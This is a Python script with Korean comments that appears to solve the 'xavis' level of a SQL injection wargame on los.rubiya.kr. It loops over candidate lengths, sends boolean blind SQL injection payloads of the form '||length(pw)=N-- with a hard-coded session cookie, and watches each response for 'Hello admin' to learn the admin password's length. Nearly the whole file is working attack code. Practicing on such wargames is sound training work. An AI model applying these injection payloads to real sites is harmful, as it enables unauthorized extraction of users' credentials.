# version 2.0
import urllib.request
from urllib.parse import quote

# pw 길이를 10단위로 검사하는 함수
def pwlength(count):
        for i in range(count-10, count, 1):
                
                # pw의 길이 수를 바꿔주면서 새로운 url을 만듦
                url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw="
                query = "'||length(pw)={}-- ".format(i)
                query = quote(query)
                new_url = url + query
                
                # los에 로그인을 해야되서 urllib.request의 객체를 생성해 헤더를 추가해줌 
                # 위에서 만든 새로운 url을 요청함
                req = urllib.request.Request(new_url)
                req.add_header("Cookie", "_ga=GA1.2.893628562.1594020923; PHPSESSID=51dqbgqmnpjh6rvbou6e5j77pr")
               
                # 요청한 정보를 돌려받은 응답 저장
                response = urllib.request.urlopen(req)
                
                # 서버가 응답한 데이터를 받아들이고,
                # 참(admin이 있는 경우)인 경우 길이 출력하며 중지시킴
                if str(response.read()).find("Hello admin") != -1:
                        print("Find password length : {}".format(i))
                        return count

                else:
                        print("{}".format(i))

                        # 10의 배수로 끝을 의미함
                        # admin 찾기 위해 계속 순환해야함
                        # => count에 10을 추가해 반환함
                        if i == (count-1):
                                count += 10
                                return count 

# pwlength()함수를 여러번 호출하기 위해 준비된 함수
# max_pw는 pwlength()의 count로 10단위 역할
# stop은 step()함수를 중지시키는 역할
def step(count,max_pw,stop):
        if count == 1:
                return
        
        # max_pw와 stop 같을 경우 pwlength()함수 호출
        if max_pw == stop:
                max_pw = pwlength(max_pw)

                # pwlength()함수 호출후에도 같다면 admin을 찾았음을 의미
                # => count 1증가시켜 step() 함수 중지시킴
                if max_pw == stop:
                        count += 1
                        step(count,max_pw,stop)

                # pwlength()함수 호출후 admin을 못찾을 경우
                # max_pw 증가
                # admin 찾기 위해 계속 pwlength()함수 호출 필요
                # => stop == max_pw 조건 만족시켜줌
                stop = max_pw
                step(count,max_pw,stop)

step(0,11,11)
